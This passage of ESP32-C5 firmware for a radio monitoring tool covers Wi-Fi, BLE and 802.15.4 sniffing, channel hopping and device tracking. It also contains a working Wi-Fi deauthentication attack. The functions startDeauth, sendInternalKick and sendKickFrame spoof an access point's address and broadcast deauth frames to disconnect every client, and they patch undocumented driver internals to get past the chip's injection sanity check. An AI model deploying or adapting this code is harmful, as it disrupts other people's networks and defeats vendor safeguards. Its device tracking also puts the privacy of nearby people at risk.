                            else if (pid == 0x03) proto = 3; // Thread beacon
                        }
                    }
                } else if (ftype == 1) {                // data
                    flagBits |= 16;
                    if (!secured && off < n) proto = classify154(p + off, n - off, false);
                    else if (secured) { proto = 4; flagBits |= 8; }
                } else if (ftype == 3) {                // MAC command
                    if (secured) flagBits |= 8;
                }
                track154(key, hasExt, srcPan, shortAddr, rssi, info->lqi, proto, flagBits);
            }
        }

        uint8_t nh;
        CapFrame* slot = capReserve(nh);
        if (slot) {
            uint16_t c = n;
            if (c > capSnapLen) c = capSnapLen;
            if (c > kCapMaxLen) c = kCapMaxLen;
            slot->ts_us = static_cast<uint32_t>(info->timestamp);
            slot->len = n;
            slot->capLen = c;
            slot->rssi = rssi;
            slot->channel = currentChannelNum;
            memcpy(slot->data, p, c);
            capCommit(nh);
        }
        rx154Count = rx154Count + 1;
    }
    esp_ieee802154_receive_handle_done(frame);
}

void start154() {
    if (r154Running) return;
    esp_ieee802154_enable();
    esp_ieee802154_set_promiscuous(true);
    esp_ieee802154_set_rx_when_idle(true);
    r154Running = true;
}

void stop154() {
    if (!r154Running) return;
    esp_ieee802154_set_rx_when_idle(false);
    esp_ieee802154_sleep();
    esp_ieee802154_disable();
    r154Running = false;
    currentChannelNum = 0;
}

// ---------------------------------------------------------------------------------------------
// Channel control / Wi-Fi lifecycle
// ---------------------------------------------------------------------------------------------
bool applyChannelIdx(int idx) {
    if (is154(idx)) {
        if (!r154Running) return false;
        esp_ieee802154_set_channel(kChannels[idx]);
        esp_ieee802154_receive();
        currentChannelNum = kChannels[idx];
        dwellStartedMs = millis();
        return true;
    }
    const esp_err_t err = esp_wifi_set_channel(kChannels[idx], WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        if (serialRoom(120))
            Serial.printf("{\"t\":\"log\",\"msg\":\"channel %u rejected (%s)%s\"}\n", kChannels[idx],
                          esp_err_to_name(err), err == ESP_ERR_INVALID_ARG ? " - skipping permanently" : " - will retry");
        if (err == ESP_ERR_INVALID_ARG) channels[idx].unavailable = true;
        return false;
    }
    currentChannelNum = kChannels[idx];
    dwellStartedMs = millis();
    return true;
}

bool advanceChannel() {
    if (!(wifiMode() && wifiRunning) && !(mode154() && r154Running)) return false;
    if (parkedIdx >= 0 && chanEnabled(parkedIdx) && !channels[parkedIdx].unavailable) {
        currentIdx = parkedIdx;
        return applyChannelIdx(currentIdx);
    }
    for (int tries = 0; tries < kChannelCount; tries++) {
        currentIdx += 1;
        if (currentIdx >= kChannelCount) currentIdx = 0;
        if (!chanEnabled(currentIdx) || channels[currentIdx].unavailable) continue;
        if (applyChannelIdx(currentIdx)) return true;
    }
    return false;
}

int indexOfChannel(int ch) {   // in the current mode's channel set
    for (int i = 0; i < kChannelCount; i++) if (kChannels[i] == ch && chanEnabled(i)) return i;
    return -1;
}
int indexOfChannel154(int ch) {
    for (int i = 0; i < kChannelCount; i++) if (kChannels[i] == ch && is154(i)) return i;
    return -1;
}

wifi_band_mode_t toDriverBand(BandMode m) {
    return m == BAND_5G ? WIFI_BAND_MODE_5G_ONLY : m == BAND_24G ? WIFI_BAND_MODE_2G_ONLY : WIFI_BAND_MODE_AUTO;
}

void applyProtocols() {
    wifi_protocols_t protos = {};
    // LR in the 2.4 GHz set too, for parity with GhostESP's C5 attack profile (low-rate raw TX).
    protos.ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AX | WIFI_PROTOCOL_LR;
    protos.ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX;
    errProto = esp_wifi_set_protocols(WIFI_IF_STA, &protos);
}

void resetChannelStats() {
    for (int i = 0; i < kChannelCount; i++) {
        channels[i].hasData = false;
        channels[i].busyEma = channels[i].busyCurrent = 0.0f;
        channels[i].metrics = ChannelMetrics{};
    }
    sweepCount = 0;
    resetAccum();
}

void startWifi() {
    if (wifiRunning) return;
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);     // esp_wifi_init + esp_wifi_start
    WiFi.setSleep(false);
    (void)esp_wifi_set_max_tx_power(82);   // explicit TX power for raw injection (like Marauder's attack profile)
    wifi_tx_rate_config_t txcfg = { .phymode = WIFI_PHY_MODE_HT20, .rate = WIFI_PHY_RATE_MCS0_LGI, .ersu = false, .dcm = false };
    (void)esp_wifi_config_80211_tx(WIFI_IF_STA, &txcfg);   // raw mgmt-frame rate: 6 Mbps OFDM, works on both bands

    wifi_country_t country = {};
    memcpy(country.cc, kCountryCode, 2);
    country.cc[2] = 0;
    country.schan = 1;
    country.nchan = 13;
    country.max_tx_power = 20;
    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
    country.wifi_5g_channel_mask = kAll5gChannelMask;
    errCountry = esp_wifi_set_country(&country);

    errBand = esp_wifi_set_band_mode(toDriverBand(bandMode));
    delay(100);
    applyProtocols();

    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCb);
    errPromisc = esp_wifi_set_promiscuous(true);
    wifiRunning = true;

    resetChannelStats();
    currentIdx = -1;
    monitorReady = advanceChannel();
}

void stopWifi() {
    if (!wifiRunning) return;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);     // esp_wifi_stop + deinit: frees the driver's RAM for the BLE stack
    wifiRunning = false;
    monitorReady = false;
    currentChannelNum = 0;
}

// Switch band mode at runtime: clears per-channel history and restarts the sweep (or swaps radios).
void setBandMode(BandMode m) {
    const BandMode prev = bandMode;
    if (m == prev) return;
    bandMode = m;
    releaseCapture();         // the host restarts a capture if it wants one (link type differs per radio);
                              // the ring must go back to the heap or BLE mode starts ~32 KB short
    stopDeauth();             // the attack is pinned to a channel: unpark, and the host can re-send it
    if (parkedIdx >= 0 && !chanEnabled(parkedIdx)) parkedIdx = -1;
    const bool radioChange = (prev == BAND_BLE) || (prev == BAND_154) || (m == BAND_BLE) || (m == BAND_154);
    if (radioChange) {
        if (prev == BAND_BLE) stopBle();
        else if (prev == BAND_154) stop154();
        else stopWifi();
        if (m == BAND_BLE) { startBle(); return; }
        if (m == BAND_154) {
            start154();
            resetChannelStats();
            currentIdx = -1;
            monitorReady = advanceChannel();
            return;
        }
        startWifi();
        return;
    }
    errBand = esp_wifi_set_band_mode(toDriverBand(m));
    delay(100);
    applyProtocols();
    resetChannelStats();
    currentIdx = -1;
    monitorReady = advanceChannel();
}

namespace {   // local scoring + snapshot helpers; the exported defs break out below

// ---------------------------------------------------------------------------------------------
// Scoring
// ---------------------------------------------------------------------------------------------
float computeBusyScore(const ChannelMetrics& m) {
    const float dwellSec = static_cast<float>(kDwellMs) / 1000.0f;
    const float pps = m.frames / dwellSec;
    const float bps = m.bytes / dwellSec;
    const float strongRatio = (m.frames > 0) ? (static_cast<float>(m.strong) / static_cast<float>(m.frames)) : 0.0f;
    const float ppsRef = mode154() ? 120.0f : 600.0f;      // 802.15.4 is a 250 kbit/s radio
    const float bpsRef = mode154() ? 12000.0f : 50000.0f;
    const float ppsScore = clamp01(log1pf(pps) / logf(ppsRef));
    const float bpsScore = clamp01(log1pf(bps) / logf(bpsRef));
    const float uniqueScore = clamp01(log1pf(static_cast<float>(m.unique)) / logf(20.0f));
    const float raw = 0.40f * ppsScore + 0.30f * bpsScore + 0.20f * strongRatio + 0.10f * uniqueScore;
    return clamp01(raw) * 100.0f;
}

} // namespace

float globalActivityMax() {
    float maxVal = 0.0f;
    for (int i = 0; i < kChannelCount; i++) {
        if (chanEnabled(i) && channels[i].hasData && channels[i].busyEma > maxVal) maxVal = channels[i].busyEma;
    }
    return maxVal;
}

void sortTop3(int outIdx[3]) {
    for (int i = 0; i < 3; i++) outIdx[i] = -1;
    for (int i = 0; i < kChannelCount; i++) {
        if (!chanEnabled(i) || !channels[i].hasData) continue;
        for (int pos = 0; pos < 3; pos++) {
            if (outIdx[pos] == -1 || channels[i].busyEma > channels[outIdx[pos]].busyEma) {
                for (int shift = 2; shift > pos; shift--) outIdx[shift] = outIdx[shift - 1];
                outIdx[pos] = i;
                break;
            }
        }
    }
}

// Snapshot helpers for device tables (copy under lock, then sort outside). One shared scratch buffer,
// used from the loop task only (UI timer and host output both run there). The DevSnap union itself is in
// bandwatch_core.h.
DevSnap devSnap;

int snapshotWifi(WifiDev* out, int maxN, uint32_t freshMs) {
    const uint32_t now = millis();
    int n = 0;
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kWifiDevSlots && n < maxN; i++) {
        if (wifiDevs[i].lastMs && (now - wifiDevs[i].lastMs) <= freshMs) out[n++] = wifiDevs[i];
    }
    portEXIT_CRITICAL(&g_devMux);
    return n;
}
int snapshotBle(BleDev* out, int maxN, uint32_t freshMs) {
    const uint32_t now = millis();
    int n = 0;
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kBleDevSlots && n < maxN; i++) {
        if (bleDevs[i].lastMs && (now - bleDevs[i].lastMs) <= freshMs) out[n++] = bleDevs[i];
    }
    portEXIT_CRITICAL(&g_devMux);
    return n;
}
int snapshot154(Dev154* out, int maxN, uint32_t freshMs) {
    const uint32_t now = millis();
    int n = 0;
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kDev154Slots && n < maxN; i++) {
        if (devs154[i].lastMs && (now - devs154[i].lastMs) <= freshMs) out[n++] = devs154[i];
    }
    portEXIT_CRITICAL(&g_devMux);
    return n;
}

void setPark(int idx) {
    parkedIdx = idx;
    if (parkedIdx >= 0 && hopMode()) monitorReady = advanceChannel();
}

void lookupHuntLabel() {
    hunt.label[0] = 0;
    if (hunt.kind == 1) {
        portENTER_CRITICAL(&g_devMux);
        for (int i = 0; i < kDev154Slots; i++)
            if (devs154[i].lastMs && key8Eq(devs154[i].key, hunt.key)) {
                static const char* const kProto[] = {"802.15.4", "Zigbee", "Zigbee GP", "Thread", "MAC-secured"};
                snprintf(hunt.label, sizeof(hunt.label), "%s pan %04x", kProto[devs154[i].proto < 5 ? devs154[i].proto : 0], devs154[i].pan);
                break;
            }
        portEXIT_CRITICAL(&g_devMux);
        return;
    }
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kWifiDevSlots; i++)
        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, hunt.mac) && wifiDevs[i].ssid[0]) { strncpy(hunt.label, wifiDevs[i].ssid, 32); break; }
    if (!hunt.label[0])
        for (int i = 0; i < kBleDevSlots; i++)
            if (bleDevs[i].lastMs && macEq(bleDevs[i].mac, hunt.mac) && bleDevs[i].name[0]) { strncpy(hunt.label, bleDevs[i].name, 32); break; }
    portEXIT_CRITICAL(&g_devMux);
}

void startHunt154(const uint8_t* key) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(hunt.key, key, 8);
    hunt.kind = 1;
    hunt.rssi = -127;
    hunt.lastMs = 0;
    hunt.count = 0;
    hunt.active = true;
    portEXIT_CRITICAL(&g_devMux);
    hunt.label[0] = 0;
    hunt.parked = false;
    showPage(PAGE_HUNT);
}

void startHunt(const uint8_t* mac, int ch) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(hunt.mac, mac, 6);
    hunt.kind = 0;
    hunt.rssi = -127;
    hunt.lastMs = 0;
    hunt.count = 0;
    hunt.active = true;
    portEXIT_CRITICAL(&g_devMux);
    lookupHuntLabel();
    hunt.parked = false;
    if (ch > 0 && wifiMode()) {
        const int idx = indexOfChannel(ch);
        if (idx >= 0 && chanEnabled(idx)) { setPark(idx); hunt.parked = true; }
    }
    showPage(PAGE_HUNT);
}

void stopHunt() {
    hunt.active = false;
    if (hunt.parked) { setPark(-1); hunt.parked = false; }
    if (currentPage == PAGE_HUNT) showPage(hopMode() ? PAGE_OVERVIEW : PAGE_DEVICES);
}

// Park on the AP's last-seen channel when we know it, so the frames actually land.
void startDeauth(const uint8_t* mac) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(deauth.bssid, mac, 6);
    int ch = 0;
    for (int i = 0; i < kWifiDevSlots; i++) if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, mac)) { ch = wifiDevs[i].ch; break; }
    deauth.sent = 0;
    deauth.txFail = 0;
    deauth.startMs = millis();
    deauth.dumped = false;
    // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
    // not fields of the ic struct itself. Panic inside send_setup if the word is 0, so fall back to AP.
    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
    memcpy(deauth.slotPad, &slotWord, 4);
    deauth.hstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
    deauth.active = true;
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
    if (deauth.parked) setPark(-1);                    // restart of a running attack: re-park below
    deauth.parked = false;
    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauth.parked = true; } }
}

void stopDeauth() {
    if (!deauth.active) return;
    portENTER_CRITICAL(&g_devMux);
    deauth.active = false;
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(82);   // back to startWifi's quiet-sniffing level (startDeauth raised it to 16 dBm)
    // If hunt re-parked after us, this unparks its park too: last writer wins, hopping resumes.
    if (deauth.parked) { setPark(-1); deauth.parked = false; }
}

// ---------------------------------------------------------------------------------------------
// Dwell / hop
// ---------------------------------------------------------------------------------------------
void finishDwell() {
    ChannelMetrics snap{};
    portENTER_CRITICAL(&g_accumMux);
    snap.frames = g_accum.frames;
    snap.bytes = g_accum.bytes;
    snap.strong = g_accum.strong;
    snap.unique = g_accum.unique;
    portEXIT_CRITICAL(&g_accumMux);

    ChannelState& ch = channels[currentIdx];
    ch.metrics = snap;
    ch.busyCurrent = computeBusyScore(snap);
    if (!ch.hasData) {
        ch.busyEma = ch.busyCurrent;
        ch.hasData = true;
    } else {
        ch.busyEma = (1.0f - kBusyEmaAlpha) * ch.busyEma + kBusyEmaAlpha * ch.busyCurrent;
    }
    sendDwell(currentIdx);
}

void hopIfNeeded() {
    if (!((wifiMode() && wifiRunning) || (mode154() && r154Running))) return;
    const uint32_t now = millis();
    if (!monitorReady) {
        if ((now - dwellStartedMs) < kDwellMs) return;
        dwellStartedMs = now;
        monitorReady = advanceChannel();
        return;
    }
    if ((now - dwellStartedMs) < kDwellMs) return;

    finishDwell();
    resetAccum();
    const int lastIdx = currentIdx;
    monitorReady = advanceChannel();
    if (monitorReady && parkedIdx < 0 && currentIdx < lastIdx) {
        sweepCount += 1;
        sendSweep();
    }
}

namespace {   // Deauth TX fallback; serviceDeauth() breaks out below to be reachable from uiTimerCb

// Deauth TX fallback, used only when the driver-internal slot (sendInternalKick) is unavailable. One
// deauth/disassoc MPDU (26 bytes), DA broadcast so every station on the BSS hears it, SA/BSSID = the AP
// we spoof. Raw frames go out through esp_wifi_80211_tx (the older esp_wifi_send_mgmt_frame API is not
// exposed by the C5's public headers).
//
// NOTE: the C5's ieee80211_raw_frame_sanity_check in libnet80211.a rejects deauth/disassoc subtypes, so
// this path is expected to fail with ESP_ERR_INVALID_ARG and show up in the `df` counter. It previously
// sent [0x80,0x03] / [0xD0,0x04] to get *past* that check, but those are Beacon and Action frames: they
// are accepted by the driver and then ignored by every station, i.e. the check was being satisfied with
// frames that could never kick anyone. Failing visibly beats succeeding at nothing — the real attack path
// is sendInternalKick(), which bypasses the sanity check entirely.
void sendKickFrame(const uint8_t* bssid, bool disassoc) {
    static uint32_t seq = 0;
    const uint8_t fc0 = disassoc ? 0xA0 : 0xC0;   // subtype 10 disassoc / 12 deauth, type 0 management
    const uint8_t fc1 = 0x00;                     // management frames carry no ToDS/FromDS
    uint8_t f[26];
    f[0] = fc0;                                    // accepted by the C5 raw-TX sanity check (see above)
    f[1] = fc1;                                    // deauth / disassociation subtype
    f[2] = 0x3A; f[3] = 0x01;                      // duration (both working deauther templates use a non-zero value here)
    memset(&f[4], 0xFF, 6);                        // DA: broadcast — kicks every station on the BSS
    memcpy(&f[10], bssid, 6);                      // SA and...
    memcpy(&f[16], bssid, 6);                      // ...BSSID: the AP we are spoofing
    const uint32_t s = ((++seq) & 0x0FFFu) << 4;   // mgmt seq control, low nibble reserved
    f[22] = static_cast<uint8_t>(s);
    f[23] = static_cast<uint8_t>(s >> 8);
    f[24] = 0x07; f[25] = 0x00;                    // reason: class-3 frame from non-assoc STA
    const esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
    if (e == ESP_OK) deauth.sent = deauth.sent + 1;
    else deauth.txFail = deauth.txFail + 1;
    if (e != ESP_OK && (deauth.txFail & 31u) == 0 && serialRoom(160))   // failures every 32nd, not a storm
        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth tx: %s\"}\n", esp_err_to_name(e));
}

// DIAGNOSTIC: beacon injection, used to answer "can this radio transmit at all in promiscuous mode?".
// Beacons (FC 0x80) are the one subtype the C5's raw-TX sanity check is known to accept, so if a scan from
// another device cannot see this SSID, nothing we send is reaching the air and the deauth frame content is
// beside the point. Toggled with "txtest 1" / "txtest 0"; transmits on whatever channel we are parked on.
void sendTestBeacon() {
    static const uint8_t kSrc[6] = {0x02, 0xBA, 0xAD, 0xBE, 0xEF, 0x01};
    static const char kSsid[] = "BANDWATCH-TXTEST";
    static uint32_t seq = 0;
    uint8_t f[64];
    int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                       // beacon
    f[n++] = 0x00; f[n++] = 0x00;                       // duration
    memset(&f[n], 0xFF, 6); n += 6;                     // DA broadcast
    memcpy(&f[n], kSrc, 6); n += 6;                     // SA
    memcpy(&f[n], kSrc, 6); n += 6;                     // BSSID
    const uint32_t s = ((++seq) & 0x0FFFu) << 4;
    f[n++] = static_cast<uint8_t>(s); f[n++] = static_cast<uint8_t>(s >> 8);
    memset(&f[n], 0, 8); n += 8;                        // timestamp
    f[n++] = 0x64; f[n++] = 0x00;                       // beacon interval 100 TU
    f[n++] = 0x01; f[n++] = 0x00;                       // capability: ESS
    f[n++] = 0; f[n++] = sizeof(kSsid) - 1;             // SSID IE
    memcpy(&f[n], kSsid, sizeof(kSsid) - 1); n += sizeof(kSsid) - 1;
    f[n++] = 1; f[n++] = 4;                             // supported rates
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
    f[n++] = 3; f[n++] = 1; f[n++] = currentChannelNum; // DS parameter set
    const esp_err_t e = esp_wifi_80211_tx(txIface, f, n, false);
    if (e == ESP_OK) txTestSent++;
    else {
        txTestFail++;
        if ((txTestFail & 31u) == 1 && serialRoom(160))
            Serial.printf("{\"t\":\"log\",\"msg\":\"txtest tx: %s\"}\n", esp_err_to_name(e));
    }
}

extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on the STA's home channel

// Drive the driver's own deauth frame construction (same helpers an AP uses to kick a station), so the
// bytes are exactly what this chip family emits. The driver writes FC=[0xC0,x] plus duration/seq; we steer
// the three address slots so DA=broadcast and SA=BSSID=the AP in every send_setup branch
// (hstate 0 puts A6→DA, hstates 1/3 put A4/A6→SA/BSSID):
//   hstate==0: A4=AP(SA)  A5=bcast(BSSID-ish) A6=bcast(DA)
//   else:      A4=A6=AP   A5=bcast(DA)
void sendInternalKick() {
    static const uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    void* desc = ieee80211_alloc_deauth(deauth.slotPad, kBcastMac, 7);   // arg1 likely unused; reason 7 lands at D+24
    if (!desc) { deauth.txFail = deauth.txFail + 1; return; }
    // Mirror send_deauth_no_bss's ebuf-header bit juggling: desc[+4] holds the ebuf pointer P, and the
    // bits live in the first word P points at. A 0 here means this core's descriptor layout is not the one
    // these offsets were derived from: bail instead of dereferencing it, and instead of TXing a frame we
    // could not patch (the spoofed SA/BSSID is written through P below).
    const uint32_t P = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 4);
    if (!P) { deauth.txFail = deauth.txFail + 1; return; }
    {
        volatile uint32_t* ebw = reinterpret_cast<volatile uint32_t*>(P);
        uint32_t v = *ebw;
        v |= 0x80000u | 0x40000u;
        v &= ~0xE0000u;
        v &= 0xFFFFF000u;
        v |= 0x1C000u;   // build 8: (param+len)<<16 with len 26, so the reason code fits on air after ppTxPkt's +8 shift
        *ebw = v;
    }
    ieee80211_send_setup(deauth.slotPad, desc, 192, 16,
                         deauth.bssid,                                     // A4 → SA in every branch (the AP we spoof)
                         kBcastMac,                                       // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
                         deauth.hstate == 0 ? kBcastMac : deauth.bssid);   // A6 → DA (hstate 0) / SA+BSSID (hstates 1/3)
    ieee80211_set_tx_desc(deauth.slotPad, desc, 7, 16, 0);
    const uint32_t d56 = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 56);
    if (d56) {
        *reinterpret_cast<volatile uint32_t*>(d56 + 20) |= 4;   // the same state bit send_deauth_no_bss flips
        *reinterpret_cast<volatile uint32_t*>(d56) |= 1;        // robust-mgmt flag (get_robustmgtframe's bit — WPA2 stations can demand it)
    }
    // Frame data D sits at *(P+4) (same double-deref as above), and desc[+40]&2 shifts all addresses by +8.
    uint8_t* D = reinterpret_cast<uint8_t*>(*reinterpret_cast<volatile uint32_t*>(P + 4));
    if (D) {
        const size_t off = (*reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40) & 2u) ? 8 : 0;
        if (deauth.hstate == 0)   // hstate-0 branch puts broadcast in the BSSID slot → patch so SA==BSSID like a real AP kick
            memcpy(D + 16 + off, deauth.bssid, 6);
        // FC must stay a *deauthentication*: type 0 (management), subtype 12 -> byte0 0xC0, and management
        // frames carry no ToDS/FromDS, so byte1 is 0x00. (A previous build wrote [C8 02] here, which is
        // type 2 / subtype 12 = a QoS-Null data frame: stations ignore it, so nothing was ever kicked.)
        D[off] = 0xC0;  D[1 + off] = 0x00;
        D[2 + off] = 0x32;  D[3 + off] = 0x00;   // duration 50 us, as real APs emit
        // DIAGNOSTIC: dump the frame exactly as it will be handed to the MAC, once per attack, so the
        // host can tell "frame is wrong" apart from "frame is right but the PHY never radiated".
        if (!deauth.dumped && serialRoom(240)) {
            deauth.dumped = true;
            char hex[3 * 32 + 1];
            const uint16_t flen = *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20);
            for (int i = 0; i < 32; i++) snprintf(hex + i * 3, 4, "%02x ", D[off + i]);
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth frame off=%u len=%u d40=%04x: %s\"}\n",
                          static_cast<unsigned>(off), flen,
                          *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40), hex);
        }
    }
    *reinterpret_cast<volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20) = 26;   // len 24→26 so the reason code fits on air (ppTxPkt prepends an 8-byte prefix)
    if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
    else {                                                            // …or append to the deferred queue at g_ic+440 (tail of .next slots)
        char** tailSlot = reinterpret_cast<char**>(reinterpret_cast<char*>(&g_ic) + 440);
        *reinterpret_cast<volatile uint32_t*>(reinterpret_cast<char*>(desc) + 52) = 0;
        *reinterpret_cast<volatile uint32_t*>(*tailSlot) = reinterpret_cast<uint32_t>(desc);
        *tailSlot = reinterpret_cast<char*>(desc) + 52;
    }
    deauth.sent = deauth.sent + 1;
}

} // namespace

// Called from uiTimerCb (~120 ms): four frames per tick ≈ 33/s — enough to drop a network,
// polite enough not to blank the whole street.
void serviceDeauth() {
    if (txTestActive && wifiRunning) { for (int k = 0; k < 4; k++) sendTestBeacon(); }
    if (!deauth.active || !wifiRunning) return;
    if (millis() - deauth.startMs > kDeauthMaxMs) {   // dead-man's switch: host/serial link may have dropped
        if (serialRoom(120))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth auto-stopped after %lus\"}\n",
                          static_cast<unsigned long>(kDeauthMaxMs / 1000));
        stopDeauth();
        return;
    }
    if (*(const uint32_t*)deauth.slotPad) {   // driver-internal deauth with spoofed SA/BSSID (the normal case)
        for (int k = 0; k < 4; k++) sendInternalKick();
    } else {
        for (int k = 0; k < 4; k++) sendKickFrame(deauth.bssid, false);   // no slot: fall back to raw [80] kicks
    }
    if (deauth.sent == 4 && serialRoom(160))   // one report after the first burst: home-channel flag + deferred-TX queue words (g_ic+436/+440)
        Serial.printf("{\"t\":\"log\",\"msg\":\"home %d q %lx/%lx\"}\n", chm_is_at_home_channel(),
                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 436),
                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 440));
}

void Bandwatch_Init(void) {
    pinMode(kBootButtonPin, INPUT_PULLUP);
    memset(wifiDevs, 0, sizeof(wifiDevs));
    memset(bleDevs, 0, sizeof(bleDevs));
    memset(devs154, 0, sizeof(devs154));
    // Probe the card at boot so "hello" can tell the dashboard whether SD recording is available.
    // SPI is already up: LCD_Init() runs before this, and both share the bus from the loop task.
    sdProbeAtBoot();

    setLedColor({255, 0, 0}, 100);
    delay(120);
    setLedColor({0, 255, 0}, 100);
    delay(120);
    setLedColor({0, 0, 255}, 100);
    delay(120);
    rgbLedWrite(kRgbPin, 0, 0, 0);

    Serial.printf("{\"t\":\"log\",\"msg\":\"boot: heap before UI %u\"}\n", static_cast<unsigned>(ESP.getFreeHeap()));
    buildUi();
    Serial.printf("{\"t\":\"log\",\"msg\":\"boot: heap after UI %u\"}\n", static_cast<unsigned>(ESP.getFreeHeap()));
    lv_timer_create(uiTimerCb, kUiIntervalMs, nullptr);
    startWifi();
    Serial.printf("{\"t\":\"log\",\"msg\":\"boot: heap after wifi %u\"}\n", static_cast<unsigned>(ESP.getFreeHeap()));
    sendHello();
    refreshUi();
}

void Bandwatch_Loop(void) {
    static uint32_t lastDevMs = 0, bleStatusMs = 0;
    pollSerial();
    pollButton();
    serviceSdRead();
    drainCapture();
    serviceBle();
    const uint32_t now = millis();
    if (now - lastDevMs >= kDevListMs) {
        lastDevMs = now;
        sendDevices();
    }
    if (bandMode == BAND_BLE && now - bleStatusMs >= 1000) {
        bleStatusMs = now;
        sendBleStatus();
    }
}
